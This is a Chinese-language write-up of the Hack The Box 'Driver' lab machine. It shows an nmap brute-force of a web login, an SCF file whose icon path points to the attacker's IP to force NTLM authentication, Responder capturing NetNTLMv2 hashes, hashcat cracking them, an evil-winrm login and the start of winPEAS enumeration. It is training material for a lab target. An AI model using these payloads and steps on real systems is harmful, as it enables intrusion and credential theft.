---
title: HTB-Driver Writeup
date: 2026-02-28T21:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - Windows
  - SMB
---
## 初始侦察
### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.95.238 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 07:47 EST
Nmap scan report for driver.htb (10.129.95.238)
Host is up (0.093s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p80,135,445,5985 10.129.95.238            
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 07:47 EST
Nmap scan report for driver.htb (10.129.95.238)
Host is up (0.093s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 10 1607 (88%), Microsoft Windows 11 (86%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Vista or Windows 7 (86%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%), Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-02-28T19:47:51
|_  start_date: 2026-02-28T19:41:55
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.98 seconds
```

共计开放了四个端口，扫描结果中提到 `Basic realm=MFP Firmware Update Center. Please enter password for admin`，可能用到的用户名为 `admin`。

### Nmap 漏洞脚本扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --script=vuln -p80,135,445,5985 10.129.95.238          
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 07:47 EST
Nmap scan report for driver.htb (10.129.95.238)
Host is up (0.11s latency).

PORT     STATE SERVICE
80/tcp   open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 294.54 seconds
```

没有更多有价值的信息。

## Web-80 端口渗透

打开 Web-80 端口，需要登入认证。

![](Pasted%20image%2020260228210717.png)

在前面的 Nmap 详细信息扫描中提示了用户名为 `admin`，使用 Nmap 尝试进一步破解这个页面。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -p80 --script=http-brute 10.129.5.91  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 08:11 EST
Stats: 0:08:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Stats: 0:08:47 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.129.5.91
Host is up (0.095s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-brute: 
|   Accounts: 
|     admin:admin - Valid credentials
|_  Statistics: Performed 45009 guesses in 535 seconds, average tps: 84.6

Nmap done: 1 IP address (1 host up) scanned in 535.72 seconds
```

破解出来账密为 `admin:admin`，尝试登入。

![](Pasted%20image%2020260228212136.png)

发下泄露了一个域名，添加进 `hosts` 中。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo bash -c 'echo "10.129.5.91 driver.htb" >> /etc/hosts'    

┌──(kali㉿kali)-[~/Work/Kali]
└─$ tail -n 1 /etc/hosts
10.129.5.91 driver.htb
```

浏览发现网站中有个文件上传入口。

![](Pasted%20image%2020260228212347.png)

靶机的 445 端口是开放的，使用 nxc 进行 SMB 共享枚举，尝试使用空密码进行匿名登入。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ nxc smb driver.htb --shares -u enil -p ''
SMB         10.129.5.91     445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) 
SMB         10.129.5.91     445    DRIVER           [-] DRIVER\enil: STATUS_LOGON_FAILURE
```

尝试进行连接。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ smbclient -L 10.129.5.91 -N                  
session setup failed: NT_STATUS_ACCESS_DENIED
```

连接失败，135 端口也是开放的，尝试使用 rpcclient 获取一些信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ rpcclient -U '' -N 10.129.5.91
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

同样连接失败，使用 enum4linux 枚举一下。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ enum4linux-ng driver.htb
ENUM4LINUX - next generation (v1.3.7)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... driver.htb
[*] Username ......... ''
[*] Random Username .. 'owkbastm'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on driver.htb    |
 ===================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: no route to host
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: no route to host
[*] Checking SMB
[-] Could not connect to SMB on 445/tcp: no route to host
[*] Checking SMB over NetBIOS
[-] Could not connect to SMB over NetBIOS on 139/tcp: no route to host

 =========================================================
|    NetBIOS Names and Workgroup/Domain for driver.htb    |
 =========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

[!] Aborting remainder of tests since neither SMB nor LDAP are accessible

Completed after 17.82 seconds
```

没有值得注意的信息。

### 内网认证机制

在非域环境下，一般是 `mtlm` 加密。这套加密体系早期叫做 LM（LAN Manager），安全性非常低，由于它使用简单的哈希算法（不包含盐值），并将密码分割成 7 个字符的块后再分别哈希，使其极易被暴力破解。再之后是 `NTLMv1`，比 LM 有更好的安全性，但仍可被较容易地破解，特别是当攻击者能够捕获到网络中的认证流量时。当前广泛使用的版本是 `NTLMv2`，进一步增强了安全性，通过引入客户端和服务器地挑战响应，以及在哈希过程中仍然使用 `HMAC-MD5`，这使得它比前两者更难被破解。但在某些条件下，特别是使用弱密码时，仍然可能被暴力破解。

### 内网协议

内网中可以用 DNS 解析主机名到 IP，但内网不一定一直有 DNS，一般内网中在没有 DNS 的时候，解析协议就会降级，降为 `NBT-NS（NetBIOS Name Service）` 和 `LLMNR（Link-Local Multicast Name Resolution）` 这种广播协议，smb 就是用这种降级协议。

### SMB（Server Message Block）

SMB 是一种在网络上用于文件共享、打印服务和其他网络通信的应用层协议。最初由 IBM 开发并由 Microsoft 进一步扩展，SMB 协议使计算机能够在局域网（LAN）中访问文件、打印机、串行端口和通信。随着技术的发展，SMB 协议经历了多次重要的更新。SMB 协议支持多种认证方式，主要的包括 `NTLM` 和 `Kerberos`。`NTLM` 是一种 挑战/响应 认证协议，广泛用于没有 `Active Directory` 环境，它通过不直接在网络中传输用户的密码，而是使用密码的散列值来完成认证，提供了基本的安全保障。而在 `Active Directory` 环境中，`Kerberos` 成为了首选的认证方法。

Responder 可以对接收到的 `NTLM` 认证尝试进行中间人共计（MITM），通过向请求者发送伪造的 `NTLM` 挑战来获取 `NTLM` 响应，这个响应包含了加密后的用户凭据的散列值。Responder 不直接解密这些散列值，而是采集这些数据，以便于离线攻击解码这些散列。

SCF 文件是一种 Windows Shell 文件，用于执行特定的的系统命令。可以用于自动化某些与 Windows 资源管理器交互的任务，例如打开特定的系统工具或控制资源管理器的行为。

创建一个 SCF 文件，访问一个不存在的 smb 地址，这样会导致解析协议降级到 nbt-ns 或 llmnr，可能触发 ntlm 认证，如何做中间人攻击。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat enil.scf 
[Shell]
Command=2
IconFile=\\10.10.16.155\enil
[Taskbar]
Command=Test
```

使用 responder 监听。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                                                                                                                     
└─$ sudo responder -I tun0 -v                                                                                                                                                                                                              __                                                                                                                                                         .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                                                                                                                            |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                                                                                                                          
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                           
                   |__|                                                                                                                                                                           
                                                                                                                                                                                                             NBT-NS, LLMNR & MDNS Responder 3.1.5.0                                                                                                                                                                                                                                                                                                                                                     To support this project:                                                                                                                                                                        
  Github -> https://github.com/sponsors/lgandx  
  Paypal  -> https://paypal.me/PythonResponder                                                                                                                                                    
                                                                                                                                                                                                  
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)                                                                                                                                               
  To kill this script hit CTRL-C                                                                                                                                                                  


[+] Poisoners:                                  
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:                                    
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]
        WinRM server               [ON]                                                                                                                                              09:03:10 [65/185]    SNMP server                [OFF]                                                                                                                                                                                                                                                                                                                                                                [+] HTTP Options:                                                                                                                                                                                 
    Always serving EXE         [OFF]            
    Serving EXE                [OFF]                                                                                                                                                              
    Serving HTML               [OFF]                                                                                                                                                                  Upstream Proxy             [OFF]                                                                                                                                                                                                                                                                                                                                                                [+] Poisoning Options:                                                                                                                                                                            
    Analyze Mode               [OFF]                                                             
    Force WPAD auth            [OFF]                                                                                                                                                              
    Force Basic Auth           [OFF]                                                                                                                                                                  Force LM downgrade         [OFF]                                                                                                                                                                  Force ESS downgrade        [OFF]                                                                                                                                                                                                                                                                                                                                                                
[+] Generic Options:                            
    Responder NIC              [tun0]                                                                                                                                                             
    Responder IP               [10.10.16.155]                                                                                                                                                     
    Responder IPv6             [dead:beef:4::1099]                                                                                                                                                
    Challenge set              [random]                                                                                                                                                           
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']                                        
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]        
                                                
[+] Current Session Variables:     
    Responder Machine Name     [WIN-V5VWOPA0X2M]
    Responder Domain Name      [14SQ.LOCAL]
    Responder DCE-RPC Port     [47012]

[+] Listening for events...                     
                                                
[SMB] NTLMv2-SSP Client   : 10.129.5.91
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:0f3d3a4556180c16:758A05F61A29B2766216AF2F45589E87:010100000000000080C02DF790A8DC01281DCEA0B2A88BC70000000002000800310034005300510001001E00570049004E002D0
056003500560057004F00500041003000580032004D0004003400570049004E002D0056003500560057004F00500041003000580032004D002E0031003400530051002E004C004F00430041004C000300140031003400530051002E004C004F004
30041004C000500140031003400530051002E004C004F00430041004C000700080080C02DF790A8DC0106000400020000000800300030000000000000000000000000200000AB616315500E1852C7379E562BF5F4BC1F8EF92EBBB6C4BB59DF47D
652564A5B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310035003500000000000000000000000000
[SMB] NTLMv2-SSP Client   : 10.129.5.91
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:ca21e3e89051ede8:D478E52273860FCB0164A9E6AD33785E:010100000000000080C02DF790A8DC0115D2FD48156979C80000000002000800310034005300510001001E00570049004E002D0
056003500560057004F00500041003000580032004D0004003400570049004E002D0056003500560057004F00500041003000580032004D002E0031003400530051002E004C004F00430041004C000300140031003400530051002E004C004F004
30041004C000500140031003400530051002E004C004F00430041004C000700080080C02DF790A8DC0106000400020000000800300030000000000000000000000000200000AB616315500E1852C7379E562BF5F4BC1F8EF92EBBB6C4BB59DF47D
652564A5B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310035003500000000000000000000000000
```

捕捉到 `tony` 的 `ntlmv2` 哈希值，详细解释一下。

```bash
[SMB] NTLMv2-SSP Client   : 10.129.5.91
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:ca21e3e89051ede8:D478E52273860FCB0164A9E6AD33785E:010100000000000080C02DF790A8DC0115D2FD48156979C80000000002000800310034005300510001001E00570049004E002D0
056003500560057004F00500041003000580032004D0004003400570049004E002D0056003500560057004F00500041003000580032004D002E0031003400530051002E004C004F00430041004C000300140031003400530051002E004C004F004
30041004C000500140031003400530051002E004C004F00430041004C000700080080C02DF790A8DC0106000400020000000800300030000000000000000000000000200000AB616315500E1852C7379E562BF5F4BC1F8EF92EBBB6C4BB59DF47D
652564A5B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310035003500000000000000000000000000
```

`tony::DRIVER` 是用户和域名，`ca21e3e89051ede8` 是用户哈希（NTLM 哈希），`D478E52273860FCB0164A9E6AD33785E` 是服务器挑战（Challenge），之后为用户响应（Response）。

使用 hashcat 破解。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo hashcat -m 5600 "tony::DRIVER:ca21e3e89051ede8:D478E52273860FCB0164A9E6AD33785E:010100000000000080C02DF790A8DC0115D2FD48156979C80000000002000800310034005300510001001E00570049004E002D0056003500560057004F00500041003000580032004D0004003400570049004E002D0056003500560057004F00500041003000580032004D002E0031003400530051002E004C004F00430041004C000300140031003400530051002E004C004F00430041004C000500140031003400530051002E004C004F00430041004C000700080080C02DF790A8DC0106000400020000000800300030000000000000000000000000200000AB616315500E1852C7379E562BF5F4BC1F8EF92EBBB6C4BB59DF47D652564A5B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310035003500000000000000000000000000" /usr/share/wordlists/rockyou.txt             
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i9-13900HX, 13912/27888 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

TONY::DRIVER:ca21e3e89051ede8:d478e52273860fcb0164a9e6ad33785e:010100000000000080c02df790a8dc0115d2fd48156979c80000000002000800310034005300510001001e00570049004e002d0056003500560057004f00500041003000580032004d0004003400570049004e002d0056003500560057004f00500041003000580032004d002e0031003400530051002e004c004f00430041004c000300140031003400530051002e004c004f00430041004c000500140031003400530051002e004c004f00430041004c000700080080c02df790a8dc0106000400020000000800300030000000000000000000000000200000ab616315500e1852c7379e562bf5f4bc1f8ef92ebbb6c4bb59df47d652564a5b0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310036002e00310035003500000000000000000000000000:liltony
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TONY::DRIVER:ca21e3e89051ede8:d478e52273860fcb0164a...000000
Time.Started.....: Sat Feb 28 09:16:52 2026 (0 secs)
Time.Estimated...: Sat Feb 28 09:16:52 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1673.0 kH/s (1.51ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32768/14344385 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 24576/14344385 (0.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 280690 -> eatme1
Hardware.Mon.#1..: Util: 13%

Started: Sat Feb 28 09:16:41 2026
Stopped: Sat Feb 28 09:16:54 2026
```

破解出来密码为 `liltony`。

## 获取立足点

使用 Netexec 测试一下获取到的账密。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nxc winrm driver.htb -u tony -p liltony
WINRM       10.129.5.91     5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.5.91     5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

登入获取初始立足点。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nxc winrm driver.htb -u tony -p liltony
WINRM       10.129.5.91     5985   DRIVER           [*] Windows 10 Build 10240 (name:DRIVER) (domain:DRIVER)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.5.91     5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo evil-winrm -i driver.htb -u tony -p liltony
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
^[[B^[[B^[[B
*Evil-WinRM* PS C:\Users\tony\Documents> 
*Evil-WinRM* PS C:\Users\tony\Documents> whoami;hostname
driver\tony
DRIVER
```

## 提权枚举

查看 Web 配置文件，一般在 C 盘下的 inetpub 下。

```bash
*Evil-WinRM* PS C:\Users\tony\Documents> cd C:\inetpub
*Evil-WinRM* PS C:\inetpub> gci


    Directory: C:\inetpub


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         9/7/2021  10:19 PM                custerr
d-----         9/7/2021  10:47 PM                history
d-----         9/7/2021  10:36 PM                logs
d-----         9/7/2021  10:19 PM                temp
d-----         9/7/2021  11:35 PM                wwwroot


*Evil-WinRM* PS C:\inetpub> cd wwwroot
*Evil-WinRM* PS C:\inetpub\wwwroot> gci


    Directory: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         9/7/2021  11:29 PM                images
-a----         9/8/2021   5:06 AM           6136 fw_up.php
-a----         9/8/2021   4:51 AM           4906 index.php
```

查看源码后无有价值的信息发现，使用 winpeas 进行进一步的枚举。

```bash
*Evil-WinRM* PS C:\programdata\apps> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
*Evil-WinRM* PS C:\programdata\apps> .\winpeas.exe log
"log" argument present, redirecting output to file "out.txt"
winpeas.exe : ERROR: Access denied
    + CategoryInfo          : NotSpecified: (ERROR: Access denied:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

*Evil-WinRM* PS C:\programdata\apps> gci


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2026   1:55 PM         117793 out.txt
-a----        2/28/2026   1:38 PM       10170880 winpeas.exe
```

将 `out.txt` 下载至 kali 查看。
